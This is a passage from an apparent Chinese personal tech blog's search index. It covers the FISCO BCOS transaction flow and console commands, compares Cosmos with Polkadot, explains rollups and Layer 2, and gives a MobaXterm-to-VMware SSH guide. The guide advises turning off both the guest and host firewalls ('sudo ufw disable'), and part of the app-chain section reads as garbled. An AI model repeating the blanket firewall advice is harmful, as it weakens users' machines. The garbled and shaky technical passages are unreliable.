验证与储存这笔交易。\n\n交易生成用户的请求给到客户端后，客户端会构建出一笔有效交易，交易中包括以下关键信息：\n\n交易构建之后，如图所示，区块链客户端会再向交易填充一些必要的字段，如用于防止交易重放的交易ID及blockLimit（区块限制），这个填充过程被称为交易构建。交易构建完成后，客户端随后便通过Channel或RPC信道将交易发送给节点。\nps:\nChannel 可以理解为一个长时间的聊天群， 想发消息的时候，客户端或是服务端直接 往这个群里发消息，对端可以直接收到并进行相应。不想发消息的时候，让它空闲就可以了。\nRPC可以理解为一次性的聊天群，发送一 个消息后，如果对端接受到并返回了响应， 那么接受到响应后，这个群就解散了。下 次想要再发送消息，就要再次建一个一次性群。\n交易池区块链交易被发送到节点后，节点会通过验证交易签名的方式来验证一笔交易是否合法。若一笔交易合法，则 节点会进一步检查该交易是否重复出现过，若从未出现过，则将交易加入交易池缓存起来。若交易不合法或交 易重复出现，则将直接丢弃交易。\n交易广播节点在收到交易后，除了将交易缓存在交易池外，节点还会将交易广播至该节点已知的其他节点。 为了能让交易尽可能到达所有节点，其他收到广播过来的交易节点，也会根据一些精巧的策略选择一些节点，将交易再一次进行广播。\n\n比如：对于从其他节点转发过来的交易，节点只会随机选择25%的节点再次广播，因为这种情况一般意味着交易已经开始在网络中被节点接力传递，缩减广播的规模有助于避免因网络中冗余的交易太多而出现的广播风暴问题。\n交易打包为了提高交易处理效率，同时也为了确定交易之后的执行顺序保证事务性，当交易池中有交易时，Sealer（共识节点）线程负责从交易池中按照先进先出的顺序取出一定数量的交易，组装成待共识区块，随后待共识区块会被发往各个节点进行处理。\n\n交易执行节点在收到区块后，会调用区块验证器把交易从区块中逐一拿出来执行。如果是预编译合约代码，验证器中的执行引擎会直接调用相应的C++功能，否则执行引擎就会把交易交给EVM（以太坊虚拟机）执行。\n\n交易共识区块链要求节点间就区块的执行结果达成一致才能出块。FISCOBCOS中一般采用PBFT算法保证整个系统的一致性，其大概流程是：各个节点先独立执行相同的区块，随后节点间交换各自的执行结果，如果发现超过2&#x2F;3的节点都得出了相同的执行结果，那说明这个区块在大多数节点上取得了一致，节点便会开始出块。\n交易落盘在共识出块后，节点需要将区块中的交易及执行结果写入硬盘永久保存，并更新区块高度与区块哈希的映射表等内容，然后节点会从交易池中剔除已落盘的交易，以开始新一轮的出块流程。用户可以通过交易哈希等信息，在链上的历史数据中查询自己感兴趣的交易数据及回执信息。\n\n同样可以作为联盟链的Hyperledger与FISCO BCOS相比有哪些异同？\n\nFISCO BCOS区块链应用案例应用场景&#x2F;行业\n应用典型案例\n\n\n\n\nFISCOBCOS控制台工具控制台简介命令行交互控制台（简称“控制台”）是FISCO BCOS 2.0重要的交互式客户端工具，它通过Java SDK与区块链节点建立连接，实现对区块链节点数据的读写访问请求。它提供一个合约编译工具，用户可以方便快捷的将Solidity合约文件编译为Java合约文件。使用控制台的相关功能需要事先搭建好FISCO BCOS区块链，以下为控制台的常用命令：\n\n控制台特点\n在应用开发场景下，控制台有以下几个特点： \n（1）实现查询区块链相关的一系列命令——让区块链“看得见摸得着”控制台能做到例如查询区块高度、交易、节点等信息，并且根据不同参数，提供不同的查询方式以满足不同条件下的查询需求。 \n（2）直接部署和调用合约 用户写好合约，放入指定路径，在控制台输入一个命令（deploy）即可完成部署，再用call指令就能调用合约接口，不需要其他任何额外的工作。另外，FISCO BCOS区块链提供CNS（合约命令服务）功能。链上可以记录部署的合约名、版本号和对应的合约部署地址；部署合约时，可以指定合约名和版本号；调用合约时，可以指定合约名和版本号。 （3）管理区块链 FISCO BCOS 2.0 提供节点管理、系统参数管理、权限管理功能，控制台均提供对应的命令进行操作，方便用户通过简单的命令轻松管理区块链。\n控制台安装\n\n控制台启动默认启动\n1./strat.sh\n\n注意：控制台启动未指定私钥账户时，会尝试从accounts目录下加载一个可用的私钥账户用于发送交易，加载失败则会创建一个新的PEM格式的账户文件，将其保存在accounts目录下\nPEM格式的文件：PEM文件是一个短的二进制文件，它包含一个独特的公钥或私钥，用于验证信息的来源和确认网站用户或服务器的身份。这种.pem文件也可以存储整个密钥链，包括根证书。\n\n指定群号启动\n1./strat.sh 2\n\n当我们FISCO BCOS的区块链有多个群组（群组1、群组2）存在时，可以根据群组号来启动控制台\n\n除了以上两种常用的启动控制台的方式之外，还有另外两种启动方式（了解即可）\n\n使用PEM格式私钥文件启动\n使用PKCS12格式私钥文件启动\n\n控制台命令控制台命令结构\n控制台命令由两部分组成，即指令和指令相关的参数：\n指令\n指令是执行的操作命令，包括查询区块链相关信息，部署合约和调用合约的指令等，其中部分指令调用JSON-RPC接口，因此与JSON-RPC接口同名。\n使用提示： 指令可以使用tab键补全，并且支持按上下键显示历史输入指令。\n指令相关的参数\n指令调用接口需要的参数，指令与参数以及参数与参数之间均用空格分隔，与JSON-RPC接口同名命令的输入参数和获取信息字段的详细解释请参考以下网址：https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/api.html\nJSON-RPC介绍 \nJSON是一种轻量级的数据交换格式，它可以表示数值、字符串、序列及名&#x2F;值对集合。而JSON-RPC是一种无状态的，轻量级的远程程序调用协议。\nJSON-RPC协议中的客户端一般是为了向远程系统请求执行某个方法。客户端向实现了JSON-RPC协议的服务端发送请求，多个输入参数能够通过数组或者对象传递到远程方法，这个远程方法也能返回多个输出数据。\nJSON-RPC所有的传输都是单个对象，用JSON格式进行序列化。JSON-RPC的请求包含三个特定属性：\n\n响应的接收者必须能够给出所有请求以正确的响应。JSON-RPC的响应包也有三个属性：\n\n常用命令常用的合约相关命令包括利用CNS部署和调用合约命令以及普通部署和调用合约命令。\n 为给业务方提供更加良好的智能合约调用体验，FISCO BCOS提出CNS（合约命名服务）方案。CNS通过提供链上合约名称与合约地址映射关系的记录及相应的查询功能，方便业务方通过记忆简单的合约名称来实现对链上合约的调用。\n1、利用CNS部署和调用合约的命令：\n\n\n部署合约：deployByCNS\n运行deployByCNS，采用CNS部署合约。用CNS部署的合约，可用合约名直接调用\n参数包含以下两部分：\n • 合约路径：合约文件的路径，支持相对路径、绝对路径和默认路径三种方式。用户输入为文件名时，从默认目录获取文件，默认目录为: contracts&#x2F;solidity。\n• 合约版本号：部署的合约版本号(长度不能超过40)。\n举了三个例子，分别是：\n • 部署HelloWorld合约1.0版； \n• 部署HelloWorld合约2.0版；\n • 部署TableTest合约1.0版； 在控制台输入合约名称以及版本号 后，成功部署了相应的合约。\n\n需要注意的是： \n• 部署用户编写的合约，可以将solidity合 约文件放到控制台根目录的 contracts&#x2F;solidity&#x2F;目录下，然后进行部 署即可。按tab键可以搜索 contracts&#x2F;solidity&#x2F;目录下的合约名称。 \n• 若需要部署的合约引用了其他合约或 library库，引用格式为import “.&#x2F;XXX.sol“;。其相关引入的合约和 library库均放在contracts&#x2F;solidity&#x2F;目录。 \n• 如果合约引用了library库，library库文件的名称必须以Lib字符串开始，以便于区分是普通合约与library库文件。 library库文件不能单独部署和调用。\n\n调用合约: callByCNS\n 运行callByCNS，采用CNS调用合约，即用合约名直接调用合约。\n参数包含以下三部分： \n• 合约名称与合约版本号：合约名称与版本号用英文冒号分隔，例如HelloWorld:1.0。当省略合约版本号时，例如HelloWorld，则调用最新版本的合约。\n• 合约接口名：调用的合约接口名。\n• 接口参数：由合约接口参数决定。参数由空格分隔，其中字符串、字节类型参数需要加上双引号；数组参数需要加上中括号，比如[1,2,3]，数组中是字符串或字节类型，加双引号，例如[“alice” , ”bob”]；布尔类型为true或者false。\n下图中各举了两组合约调用的例子，分别是对set以及get接口的调用，在控制台输入合约名称、版本号以及接口名称和参数后，成功调用了合约。\n\n\n查询CNS部署合约信息: queryCNS \n运行queryCNS，根据合约名称和合约版本号（可选参数）查询CNS表记录信息（合约名和合约地址的映射）。 \n参数包含以下两部分： \n• 合约名称：部署的合约名称。\n• 合约版本号：(可选)部署的合约版本号。\n下图中各举了一个查询CNS表记录信息的例子，分别在控制台输入合约名称和合约版本号，成功获取了记录表信息。\n\n普通部署和调用合约命令\n\ndeploy\ncall\n\n在应用开发场景下，deploy命令用于部署合约，call命令用于调用合约\n部署合约(默认提供HelloWorld合约和TableTest.sol进行示例使用)：\n参数包含以下一部分： \n• 合约路径：合约文件的路径，支持相对路径、绝对路径和默认路径三种方式。用户输入为文件名时，从默认目录获取文件，默认目录为: contracts&#x2F;solidity，比如：HelloWorld。\n下图中分别通过三种路径方式来对HelloWorld合约进行了部署。\n\n\n调用合约: call \n运行call，调用合约。\n 参数包含以下四部分：\n • 合约路径：合约文件的路径，支持相对路径、绝对路径和默认路径三种方式。用户输入为文件名时，从默认目录获取文件，默认目录为: contracts&#x2F;solidity。\n• 合约地址: 部署合约获取的地址，合约地址可以省略前缀0，例如，0x000ac78可以简写成0xac78。 \n• 合约接口名：调用的合约接口名。 \n• 接口参数：由合约接口参数决定。参数由空格分隔，其中字符串、字节类型参数需要加上双引号；数组参数需要加上中括号，比如[1,2,3]，数组中是字符串或字节类型，加双引号，例如[“alice” , ”bob”]，注意数组参数中不要有空格；布尔类型为true或者false。 \n下图中通过调用HelloWorld合约中的get与set接口完成了对name字符串的设置。\n\n\n其他常用命令：\n\n","url":"2024/12/26/FISCOBCOS联盟链/","date":"2024-12-26"},{"title":"Layer0-2","content":"项目举例Cosmos设计目的\n\nCosmos 的设计目标是成为可以建立各类区块链通信、共享的底层架构。\nCosmos SDK 是一套具有开箱即用的共识和执行工具，允许任何人创建自己的 PoA&#x2F;PoS 区块链。\n\n\nCosmos 不是 ETH 这个 L1 的 L0。\n\nCosmos 上可以建立自己的 L1，主要分为：\n\n平台类的链（如 Terra）\n应用链（App Chain）\n\n\n各类链通过 IBC（Inter-Blockchain Communication Protocol） 连接 Cosmos Hub。\n\nCosmos 的设计前提：\n\n基于智能合约的虚拟机在灵活性、主权和性能上受限。\nCosmos 不是建立一个可运行多应用的单一虚拟机，而是鼓励和促进为每个用例创建单独的区块链。\n应用程序开发者可以灵活选择架构、语言等，最后通过 Cosmos 的多链通信层 IBC 实现互操作性。\n\n\n\n术语\n单个区块链被称为：区（zone）\n连接模块被称为：中心（hub）\n\n关于Cosmos\n\nCosmos打造了全套的标准化开发工具，降低开者发门槛，实现公链开发的标准化以及公链网络互通，包括Tendermint共识引擎，Cosmos SDK 的模块化开发框架，IBC通信协议，同时自己建立了一条枢纽链，称为Cosmos Hub，连接所有Cosmos生态公链\nTendermint共识引擎:提供了通用的网络层和共识层，基于POS机制，开发者可以直接采用，专心设计应用层\nCosmos SDK:包含各种应用层常用模块，开发者可以直接调用IBC通信协议:Cosmos生态链间的网络传输协议\n枢纽Cosmos Hub:更新所有Zone的区块头作为验证的信息，记录所有链的数据和交易记录，作为不同的Zone间的通信枢纽分区Zone:连接到枢纽的各条公链也被称为分区(Zone)\n\n关于波卡\n\n波卡打造了基于Substrate创的主链称为中继链，中继链配有被称作“插槽”的接口，让其他公链通过插槽接入中继链，通过插槽与中继链链接的公链称为平行链(parachains)\n中继链:验证各个平行链给出来的区块，并给出最终确定性的证明，接入中继链的公链可以以任何自治方式产生区块\n平行链:主要负责数据的运算和交易信息的处理，通过多条平行链，就可以完成区块链的横向扩展，解决区块链的性能问题\nSubstrate:波卡设计的开发模板\n\n\nCosmos与波卡（Polkadot）区别1.安全性🌐Polkadot - 共享全局安全\n平行链（Parachain）：独立的状态机，拥有自定义规则、共识算法和手续费结构。\n中继链（Relay Chain）：母链，负责维护所有平行链的“全局状态”。\nGRANDPA 共识机制：快速确认平行链区块，保障网络安全性。\n共享安全性：中继链的验证者数量越多（如1000名验证者），平行链的安全性越高。\n缺点：\n平行链状态需由中继链验证者确认，存在被恶意拒绝的风险。\n为降低风险，Polkadot 会对验证者进行混洗，随机分配验证任务。\n\n\nFishermen（渔夫）机制：专门监控验证者行为，防止作恶。\n\n\n🌐 Cosmos - 独立的局部安全\n每条链完全独立，有自己专属的共识机制和验证者集合。\n安全性独立：每条链需自己保障安全，验证者只保护本链。\n中心枢纽-分区模型（Hub &amp; Zone）：通过中心枢纽（Hub）实现不同区块链（Zone）之间的通信。\nIBC 协议（跨链通信）：实现链与链之间的消息和代币转移，初期支持代币传输，后续支持更多消息类型。\n优缺点对比：\n优点：应用链控制力强，适合大公司（如币安、Telegram）自己主导和管理。\n缺点：小型应用难以搭建强大的验证者集，安全性难以保障。\n\n\n\n\n✅ 总结核心区别：\n\nPolkadot：统一共享安全，弱化单链控制力，适合需要安全保障和互操作性的应用。\nCosmos：每链独立，安全性自负，适合想要完全掌控自己链的企业或项目。\n\n2.治理和参与📌 参与规则差异✅ Polkadot\n结构固定：中继链 + 最多约 100 条平行链（数量未来可能调整）。\n平行链使用权通过竞拍获得：\n采用拍卖机制，最高出价者中标。\n中标者需锁定大量 DOT（原生代币）。\n竞拍成功后，可在一定期限内使用平行链。\n退出规则：只有不再使用平行链时，才能解锁 DOT。\n\n\n\n✅ Cosmos\n结构灵活开放：任何人都可创建中心枢纽（Hub）或分区（Zone）。\n不设上限或统一竞拍机制，开放参与。\n示例：\nCosmos Hub（由 Tendermint 团队开发）\nIris Hub（面向中国及亚洲市场）\n\n\n中心枢纽-分区模型简化跨链通信，避免链链直连。\n\n\n📌 治理流程差异✅ Polkadot\n治理依赖 DOT 质押量：\n投票权重按持有和质押的 DOT 数量决定。\n\n\n设立治理委员会：\n代表不活跃的 DOT 持有者投票。\n委员会从 6 人开始，每两周增加 1 人，最多 24 人。\n\n\n治理功能强大，可调整：\n中继链参数（如出块时间、区块奖励等）\n平行链竞拍规则及所需 DOT 数量\n\n\nDOT 持有者无权强制下架某条平行链：\n只能改变后续的参与流程。\n平行链租期内享有完整使用权，受保护。\n\n\n\n✅ Cosmos\n无统一治理，各 Hub 和 Zone 自治。\nCosmos Hub 的治理流程（代表性示例）：\n任何人可提交提案。\nATOM 质押者按质押量投票，决定提案是否通过。\n\n\n治理规则完全由各自链决定，灵活度高。\n示例文档：Chorus One 的《Cosmos Hub 治理机制》详细介绍了流程。\n\n3. 跨链通信对比📌 设计目标与通信方式✅ Polkadot\n目标：实现 任意消息传递（不仅限于资产转移）\n平行链 A 可直接调用平行链 B 的智能合约，转账或传递任意数据\n\n\n通信协议：ICMP（Inter-Chain Message Passing）\n所有平行链共享同一中继链的安全性\n\n✅ Cosmos\n目标：聚焦 资产转移\n优先实现代币跨链转账\n\n\n通信协议：IBC（Inter-Blockchain Communication）\n每条链独立，通信时需信任目标链的验证者集\n\n\n📌 安全性设计与挑战✅ Polkadot\n共享安全性：\n所有平行链安全等级一致，可互相信任\n\n\n解决分叉与重组问题：\n如果平行链出现无效区块，Fisherman（渔夫）机制 可举报并回滚全网状态\n\n\n数据可用性挑战：\n验证者随机分配至不同平行链，需频繁下载新链状态，带来巨大技术难题\n\n\n如果中继链出现错误，全网所有平行链都会受影响（牵一发动全身）\n\n✅ Cosmos\n各链独立安全：\n每条分区链有自己的验证者集\n通信时，必须信任对方分区的验证者\n\n\n分叉和双花风险：\n如果目标分区（如 Ethermint）验证者恶意，可能双花代币\n风险仅限于该分区及持有该分区代币的其他分区用户\nCosmos 架构设计为 “局部受损可控”，防止恶意行为蔓延至全网\n\n\n\n还有共识算法，SDK等\n\n什么是应用链（App Chain）📌定义应用链（Appchain），全称 “应用专属链”，是为特定应用（DApp）量身打造的区块链，专门服务于某个应用或某一类应用场景。\n与以太坊等通用公链不同，应用链并不追求通用性和兼容所有应用，而是聚焦在某个特定业务领域，优化性能、费用、交互体验、安全性等方面。\n\n核心特点：\n专为特定 DApp 或垂直行业设计\n例如 GameFi、DeFi、NFT、社交、支付等场景；\n性能、规则、经济模型完全围绕目标应用优化。\n\n\n性能更优\n高吞吐、低延迟、低 gas 费，满足 Web3 中的 Web2 级体验需求；\n适合高频交易场景，如游戏、社交等。\n\n\n更灵活的治理和经济模型\n应用方（DApp 项目方）拥有更强的自主权；\n设计自己的 token 经济模型、手续费规则。\n\n\n安全模型可依托主链或自建\n可以依附在 Cosmos、Polkadot 这样的跨链生态，享受共享安全；\n也可以自建共识和安全机制。\n\n\n\n\n举例理解：\nYuga Labs 的 ApeChain（BAYC 背后的专属链）\nBAYC 社区因 NFT 链上交易费用高，转而建设自己的应用链；\n所有 BAYC 生态内的交易、NFT 发行、游戏运行全在 ApeChain 上完成，降低费用、提升体验。\n\n\nOasys 专门为游戏打造的链\n设计为玩家免 gas 费，适合高频互动的区块链游戏环境。\n\n\n\n📈 应用链优势\n可以满足 Dapp 的高吞吐量要求和低费用要求，在无需许可的 Web3 环境中需要 Web2 性能的应用程序应运而生，将感应性应用作为第一实验场景。Gamefi 应用是最显性的例子，大部分 Gamefi 需要极高的吞吐量来支撑用户的实时体验与高频交互功能。\n若 Dapp 需一种子链上存在的证明技术，那么另一种选择是构建另一条实现该技术的应用链：\n例子如知识证明，如 zk-Snarks 或 zk-Starks。\n关注点是给到 Dapp 或证明用户外与构建区块无关、而是生成证明用的高效计算，并且这条链的安全性用原链来担保。\n\n\nOasys 提出的应用链可以免去终端用户交互时支付 Gas 的困扰：\n当用户操作 Dapp 时，用户向 Dapp 支付费用，费用再由 Dapp 汇总后统一支付 Gas。\n\n\n应用链模式的核心思想是为了解决 Dapp 的链资源的经济没有衡量、代表处在 Dapp 中提供的经济价值的交易并以相应的形式支付给公共链的问题。\n代表 Dapp 经济体必不可少、代表 Dapp 经济的支付通道。\n\n\n垂直应用链能在 Dapp 的应用需求内应用 Dapp 的所有功能，应用链的建设交付形式灵活：\nYuga Labs 将 BAYC 生态系统作为一条链的主要组成部分。\n在项目的 NFT 收购期，BAYC 社区因此支付了巨额费用，交易数量支持他们的 ApeChain 被议论甚至使用在 BAYC 的经济体系中。\n\n\n\n作用\n公链通用性强，但性能、费用、定制化等方面存在瓶颈；\nDApp 越来越复杂、用户量越来越大，跑在以太坊等主链上成本太高；\n应用链可以：\n降低用户使用门槛（如免 gas 费）\n提升性能（高 TPS）\n灵活设计规则，服务专属生态。\n\n\n\n\n📉 应用链的劣势\n安全性在应用侧的设计上，安全性很大程度上取决于 Dapp 的采用和 Dapp 原生代币的价格。\n跨链交互和合作，每个 Dapp 都与其他 Dapp 隔离，交互需要跨链传输或应用链交互。\n跨链风险。\n\n在 L0 架构上，开发者的风险不会被绑定在某一条链上。当底层链发生变动时，应用几乎可以零成本地迁移到另一条链上。\n防欺诈证明（Fraud Proof）\n机制：将数据重新记录\n示例：Plasma\n\n“防欺诈证明（Fraud Proof）” 是区块链 Layer 2 扩容方案 中的重要概念，尤其出现在 Optimistic Rollup（乐观汇总） 机制中。它的核心作用是： ✅ 检测欺诈，✅ 确保安全性，✅ 防止恶意行为者提交错误的区块或交易数据。\n\n📖 防欺诈证明的原理：在 Optimistic Rollup 中，链下批量处理了大量交易后，把交易结果直接提交到以太坊主链上，但默认“乐观”地假设这些交易都是有效的。\n为了防止有人作恶，系统设计了 “挑战期（Challenge Period）”，在这期间：\n\n任何人（通常是验证者）都可以对 Rollup 提交的交易结果发起“欺诈挑战”；\n如果发现数据有假、状态计算有错或存在双花，就提交 Fraud Proof（欺诈证明）。\n\n\n⚙ 举个例子：假设有一批交易被打包上链，但里面有人试图把自己的 1 ETH 变成 10 ETH。 1️⃣ 骗子把假数据提交上主链； 2️⃣ 在挑战期内，有人发现了这个问题； 3️⃣ 这名挑战者提交 Fraud Proof，证明那条交易有错； 4️⃣ 以太坊主链验证无误后，撤销这批错误交易，并奖励挑战者。\n关于侧链（Side Chain）📌 工作原理（How does it work?）\n双向锚定（Two-way peg）\n第三方参与（Presence of the third-party）\n简单支付验证（SPV 证明）：主链锁仓，侧链使用（Simple Payment Verification proof: coins locked on the mainchain for sidechain）\n\n\n✅ 优点（Pros）\n提升交易吞吐量（Increase transaction throughput）\n降低交易费用（Reduce transaction fee）\n保持交易隐私（The privacy of the transactions can be maintained）\n\n\n❌ 缺点（Cons）\n更中心化，由第三方控制（More centralised, controlled by third-party）\n桥被多次攻击（The bridge has been hacked many times）\n\n\n📖 总结归纳：这是典型的“跨链桥”或“侧链”运行机制：\n\n核心机制：双向锚定 + 第三方监管 + SPV 证明\n优势：提高性能、降低费用、保护隐私\n劣势：中心化风险较高、桥容易被黑（安全性隐患）\n\nMerkle Proof 相关（原文无详细内容，分类占位）\n\nL2 扩容方案\n将交易放在线下（L2）计算，如 State Channel。\n只有交易始末状态在 L1 上做记录。\n\n主流 L2：Rollup✅ 优点（Pros）\n上传到主链的数据量非常少（Data posted on the mainchain is the minimum）\n执行后的交易打包成批次上传到主链（Each batch of executed transactions is bundled and is posted on the mainchain）\n只需要验证 Rollups 中的交易（Validate the rollups transaction required）\n安全性更高（Much more secured）\n\n\n❌ 缺点（Cons）\n乐观 Rollup（Optimistic Rollups） 的主要缺点是提现时间长（A major limitation of Optimistic rollups is the longer withdrawal time）\nZK Rollup 仍在成长和完善中（Still in the middle of maturing for zkRollup）\n\n实现方式\n\n在 L1 上写一个合约，主要功能：\n将所有要打包的交易做成一个 Merkle Tree\n\n\n\nRollup 类型\nZK Rollup\nOptimistic Rollup（O_Rollup）\n\n区别\n✅ ZK Rollup（Zero-Knowledge Rollup）\n原理：\n\n使用 零知识证明（ZK Proof），将大量交易打包后生成一份数学证明，上传主链。\n主链验证这份证明即可，无需验证每笔交易。\n\n优点：\n\n提现快，几乎即时到账（因为有数学证明保障）\n安全性强，难以作恶\n数据上链少，效率高\n\n缺点：\n\n技术复杂，开发难度大\n支持的智能合约类型有限（目前难以处理复杂合约逻辑）\n仍在完善和成熟中（如图所示）\n\n\n✅ Optimistic Rollup（O_Rollup）\n原理：\n\n假设所有交易都是有效的（**”乐观假设”**）\n只有在有人质疑时，才会触发欺诈证明（Fraud Proof）验证\n\n优点：\n\n支持复杂的 EVM 智能合约，兼容性好\n技术成熟度较高，已有很多项目部署（如 Arbitrum、Optimism）\n\n缺点：\n\n提现等待时间长（通常 7 天）——需要给挑战者时间提出质疑\n安全性依赖欺诈证明机制，挑战者必须在线监督\n\n\n\nValidium 与 Volition\nValidium：计算与数据存储在线下\nVolition：更灵活的整体解决方案\n\nStarkEx\nStarkEx 是 Validium 和 Volition 的典型实现项目\n\n\n\n在区块链设计中，性能（Performance）、可组合性（Composability）、去中心化（Decentralization） 三者很难同时兼顾，通常只能兼得其中两个，牺牲一个。\n三个维度代表的内容：\n\nPerformance（性能）\n高吞吐量、低延迟\n代表：BSC、Polygon、xDAI（性能高，但去中心化较弱）\n\n\nComposability（可组合性）\n合约之间自由组合、无缝调用，DeFi 项目互通\n代表：Uniswap、Compound、Aave、Curve（DeFi 协议）\n\n\nDecentralization（去中心化）\n强安全性、抗审查、真正的无中心化控制\n代表：ZK Rollups（Starkware）、Optimism、Arbitrum\n\n\n\n\n图中项目归类示例：\n\n\n\n分类\n项目示例\n特点\n\n\n\n性能优先\nBSC、Polygon、xDAI\n高吞吐，低 Gas，但中心化程度高\n\n\n去中心化优先\ndYdX、DeversiFi、Sorare、StarkWare ZK rollup\n高安全、抗审查，但性能受限\n\n\n可组合性优先\nUniswap、Compound、Aave、Curve\n协议可叠加组合，DeFi 乐高，但可能性能瓶颈\n\n\n平衡点靠近去中心化一侧\nOptimism、Arbitrum\n采用 Optimistic Rollup，试图兼顾可组合性和去中心化\n\n\n\n以太坊与 L2   扩展1️⃣ Ethereum and Its Limitations（以太坊及其局限）\n✨ 以太坊优点：\n\n支持复杂智能合约，功能强大；\n生态最繁荣，DeFi、NFT、DApp、GameFi 项目众多；\n安全性极高，去中心化程度优秀。\n\n⚠ 局限与瓶颈：\n\nTPS（每秒交易量）低：原生 L1 只有 15-30 TPS；\nGas 费用高：网络一拥堵，交易费可达几十甚至上百美金；\n延迟高：交易确认慢，用户体验差；\n不适合高频、低价值交易场景（比如链上游戏、社交）。\n\n\n2️⃣ Blockchain Scaling Landscape（区块链扩容全景）\n扩容是为了提升区块链性能，降低费用，提升用户体验。区块链扩容方法大致分为两大类：\nLayer 1 扩容（直接升级主链）\n\n升级共识机制（如以太坊从 PoW 转向 PoS）\n分片（Shard）\n优化底层架构\n\nLayer 2 扩容（主流方向）\n\n把计算或交易放到“主链之外”处理，再将结果提交到主链\n保持以太坊安全性，但提高 TPS、降低费用\n\n\n3️⃣ Layer 2 Scaling Solutions（Layer 2 扩容方案）\nLayer2 是目前解决以太坊扩容最热门和成熟的路线。主流 Layer2 方案有：\n\n\n\n类型\n代表项目\n原理\n优点\n\n\n\nRollups\nArbitrum, Optimism\n批量打包交易后上传主链\n安全性强，生态成熟\n\n\nZK Rollups\nzkSync, StarkNet\n零知识证明+打包\n安全强，数据隐私好，技术门槛高\n\n\nPlasma\nOMG\n定期提交子链状态\n简单轻量，适合特定场景\n\n\nValidium\nImmutable X\n类 ZK Rollup，数据不上链\n超低费用，适合 NFT 游戏\n\n\nState Channels\nCeler, Raiden\n双方链下互操作，最后上链\n快速，适合小游戏\n\n\n\n4️⃣ The Trilemma Choice of Layer 2（Layer 2 的三难选择）\n区块链三难问题（Scalability Trilemma）： \n安全性（Security） \n去中心化（Decentralization）  \n可扩展性（Scalability）\n理论上很难三者兼顾，Layer2 设计时也面临类似的选择：\n\n\n\n选重安全\n选重可扩展性\n选重去中心化\n\n\n\nZK Rollup\nValidium、侧链\nPlasma、部分 Rollup\n\n\n\n总结\n\n\n模块\n核心内容\n\n\n\nEthereum and its limitations\n以太坊性能差、贵、慢，不适合大规模应用\n\n\nBlockchain scaling landscape\n扩容方法全景：L1 扩容 vs L2 扩容\n\n\nLayer 2 scaling solutions\n主流 L2 技术：Rollup、ZK Rollup、Plasma 等\n\n\nThe trilemma choice of Layer 2\nLayer2 设计必须在安全、去中心化、可扩展之间权衡\n\n\nIBC 指数什么是 IBC？IBC（Inter-Blockchain Communication Protocol）即 跨链通信协议，是 Cosmos 生态核心功能，用于连接不同的区块链（被称为“Zone”）实现：\n\n跨链资产转移\n跨链消息传递\n互操作性（Interoperability）\n\nCosmos 的愿景就是通过 IBC 把不同的应用链连接起来，形成“区块链互联网”。\n\nIBC 指数的含义（行业用法）IBC 指数 通常用于衡量：\n\n接入 IBC 协议的链数量\n跨链交易次数和活跃度\n跨链资产流通量\n生态增长速度（比如 Cosmos Hub、Osmosis、Juno 等链的活跃程度）\n\nIBC 指数的价值\n\n\n优势\n说明\n\n\n\n衡量 Cosmos 生态繁荣度\n参与 IBC 的链越多，生态网络效应越强\n\n\n帮助投资者和开发者决策\n哪些链活跃、哪个 DApp 适合部署\n\n\n反映真实链间交互\n比单链交易量更能反映“跨链生态”的活跃度\n\n\n","url":"2025/03/22/Layer0-2/","date":"2025-03-22"},{"title":"MobaXterm操作","content":"前置条件利用ubantu系统在VMware上配置Linux系统虚拟机\n【两分半钟完成VMware安装及Linux-Ubuntu安装（全程无废话）】https://www.bilibili.com/video/BV1W34y1k7ge?vd_source=8d7dd382f6f8f6be47abce702685a0b0\n（参考此视频）\n虚拟机上Ssh的开启与安装\n【Linux虚拟机开启SSH服务 -  CSDN App】http://t.csdnimg.cn/JE5nY\nPs:还要注意要将虚拟机和电脑主机的防火墙关闭\n过程一、查看虚拟机的 Host 信息启动 VMware 虚拟机，进入 Ubuntu 系统。在虚拟机内，点击 应用程序，然后选择 终端 打开命令行界面。(或者直接快捷键Ctrl + Alt + T 打开终端)输入命令 ifconfig 查看虚拟机的 IP 地址和主机信息。红框中显示的是虚拟机的 IP 地址。\n\n下面显示的是虚拟机的用户名（如：root123）。\n\n注：用户名和密码是创建虚拟机时设定的。\n二、通过 MobaXterm 连接虚拟机\n\n打开 MobaXterm。\n\n点击左上角的 Session（会话），然后选择 SSH。\n\n在弹出的窗口中，输入虚拟机的 Host（IP 地址）和 用户名（如：root123）。\n\n\n\n端口 保持默认（通常是 22）。\n\n\n点击 OK 生成会话。\n\n\n\n会提示输入虚拟机的 密码，注意：输入密码时不会显示字符。\n\n\n如果是第一次连接，MobaXterm 可能会要求设置一个 MobaXterm 密码（至少七位字符）。输入完密码后，成功连接后会进入虚拟机的命令行界面。\n\n出现问题\ntime out\n\na. 可能是虚拟机上的ssh 未开启&#x2F;未安装\nb. 虚拟机网络信息不可用。\nc. 可能虚拟机防火墙未关\n（虚拟机防火墙关闭指令：\n\nCtrl+shift+T敲出终端\n\n关闭防火墙：sudo ufw disable  若提示成功，则已关闭）\n\n查看防火墙状态：sudo ufw status 若显示inactive则关闭）\n\n\n\nconnection refused\n\na. 可能电脑防火墙未关\n\nAccess denied\n\na. 密码错误\nb. 网络模式非NAT（在虚拟机-编辑-虚拟网络编辑器中设置）\n\n对于b步的解决方式：\n​\t\t更改设置——nat模式——nat设置——添加\n\n\nc. 虚拟机没有网络信息（右上角刷新&#x2F;重启虚拟机）\n\n对于c步的补充：尝试【VMware 虚拟机里连不上网的三种解决方案_vmware虚拟机无法连接网络 -  CSDN App】http://t.csdnimg.cn/68KCp\n\n还有一些我没有遇到的常见问题补充：\n\n【使用MobaXterm远程连接虚拟机以及遇到的问题 -  CSDN App】http://t.csdnimg.cn/0r1l6\n\n以及主要的【Mobaxterm连接虚拟机报 Access denied错误 -  CSDN App】http://t.csdnimg.cn/J0dK3 （ 中间还用到安装vim方法【Linux虚拟机中安装vim（超详细） -  CSDN App】http://t.csdnimg.cn/SGvmm ）\n\n\n","url":"2025/04/20/MobaXterm操作/","date":"2025-04-20"},{"title":"NFT","content":"NFT与数字资产的未来1. NFT定义与核心特性NFT（Non-Fungible Token）：非同质化代币  \n简单理解:NFT是发行在链上的不可分割、不可复制的具有唯一性的，可以铆钉现实世界商品的资产。\n2. NFT的核心价值2.1 产业变革\n版权保护：  \n艺术家通过NFT直接掌控作品分发、转售权（如音乐、画作版权）。  